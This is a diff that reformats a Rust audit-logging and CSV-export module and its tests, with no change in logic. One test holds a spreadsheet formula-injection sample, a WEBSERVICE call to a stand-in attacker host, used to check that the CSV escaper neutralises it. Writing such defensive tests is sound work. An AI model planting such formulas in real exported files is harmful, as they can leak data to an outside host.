@@ -162,7 +162,10 @@ pub async fn record_llm_egress(
             "ok",
             format!("[REDACTED_RESPONSE length={response_chars} chars]"),
         ),
-        EgressOutcome::Error { partial_chars, error } => (
+        EgressOutcome::Error {
+            partial_chars,
+            error,
+        } => (
             "error",
             format!(
                 "[STREAM_ERROR after {partial_chars} chars: {}]",
@@ -466,7 +469,10 @@ pub async fn export_to_csv(
         ));
     }
 
-    Ok(ExportResult { csv_content: csv, row_count })
+    Ok(ExportResult {
+        csv_content: csv,
+        row_count,
+    })
 }
 
 // ============================================================================
@@ -582,7 +588,10 @@ mod tests {
         // The single-quote prefix forces Excel to render the string literally.
         let attack = "=WEBSERVICE(\"http://attacker.tld\")";
         let out = escape_csv(attack);
-        assert!(out.starts_with('"'), "should be quoted for the embedded quote");
+        assert!(
+            out.starts_with('"'),
+            "should be quoted for the embedded quote"
+        );
         assert!(
             out.contains("'=WEBSERVICE"),
             "leading single quote missing: {out}"
@@ -606,7 +615,10 @@ mod tests {
             "formula prefix missing inside quoted field: {at_with_comma}"
         );
         let cr_attack = escape_csv("\rSUM(1)");
-        assert!(cr_attack.contains("'\r"), "formula prefix missing: {cr_attack:?}");
+        assert!(
+            cr_attack.contains("'\r"),
+            "formula prefix missing: {cr_attack:?}"
+        );
     }
 
     #[test]
@@ -635,7 +647,11 @@ mod tests {
 
     #[test]
     fn test_employee_ids_json_serialization() {
-        let ids = vec!["emp-1".to_string(), "emp-2".to_string(), "emp-3".to_string()];
+        let ids = vec![
+            "emp-1".to_string(),
+            "emp-2".to_string(),
+            "emp-3".to_string(),
+        ];
         let json = serde_json::to_string(&ids).unwrap();
         assert_eq!(json, r#"["emp-1","emp-2","emp-3"]"#);
 
@@ -750,12 +766,11 @@ mod tests {
         .await
         .expect("partial row must write");
 
-        let (source, status, response): (Option<String>, Option<String>, String) = sqlx::query_as(
-            "SELECT source, status, response_text FROM audit_log",
-        )
-        .fetch_one(&pool)
-        .await
-        .unwrap();
+        let (source, status, response): (Option<String>, Option<String>, String) =
+            sqlx::query_as("SELECT source, status, response_text FROM audit_log")
+                .fetch_one(&pool)
+                .await
+                .unwrap();
         assert_eq!(source.as_deref(), Some("interactive"));
         assert_eq!(status.as_deref(), Some("error"));
         assert!(
@@ -813,7 +828,10 @@ mod tests {
             &pool,
             &ctx,
             "req",
-            &EgressOutcome::Error { partial_chars: 0, error: huge_error },
+            &EgressOutcome::Error {
+                partial_chars: 0,
+                error: huge_error,
+            },
         )
         .await
         .unwrap();
@@ -836,7 +854,10 @@ mod tests {
         // history, so pin them.
         assert_eq!(EgressSource::Interactive.as_str(), "interactive");
         assert_eq!(EgressSource::MemorySummary.as_str(), "memory_summary");
-        assert_eq!(EgressSource::HighlightExtraction.as_str(), "highlight_extraction");
+        assert_eq!(
+            EgressSource::HighlightExtraction.as_str(),
+            "highlight_extraction"
+        );
         assert_eq!(EgressSource::HighlightSummary.as_str(), "highlight_summary");
         assert_eq!(EgressSource::TitleGeneration.as_str(), "title_generation");
         assert_eq!(EgressSource::RecruitingIntake.as_str(), "recruiting_intake");
@@ -950,7 +971,10 @@ mod tests {
                 .fetch_one(&pool)
                 .await
                 .unwrap();
-        assert_eq!(audit_count, 1, "audit row must survive conversation deletion");
+        assert_eq!(
+            audit_count, 1,
+            "audit row must survive conversation deletion"
+        );
 
         let (conv_id,): (Option<String>,) =
             sqlx::query_as("SELECT conversation_id FROM audit_log WHERE id = 'a1'")
@@ -972,12 +996,15 @@ mod tests {
         // will break at runtime because the SET NULL / NO ACTION interplay
         // with the append-only trigger is what motivated dropping the FK.
         let pool = test_pool_with_migrations().await;
-        let fks: Vec<(String,)> = sqlx::query_as(
-            "SELECT \"table\" FROM pragma_foreign_key_list('audit_log')",
-        )
-        .fetch_all(&pool)
-        .await
-        .unwrap();
-        assert!(fks.is_empty(), "audit_log must have no FKs after migration 011, got: {:?}", fks);
+        let fks: Vec<(String,)> =
+            sqlx::query_as("SELECT \"table\" FROM pragma_foreign_key_list('audit_log')")
+                .fetch_all(&pool)
+                .await
+                .unwrap();
+        assert!(
+            fks.is_empty(),
+            "audit_log must have no FKs after migration 011, got: {:?}",
+            fks
+        );
     }
 }
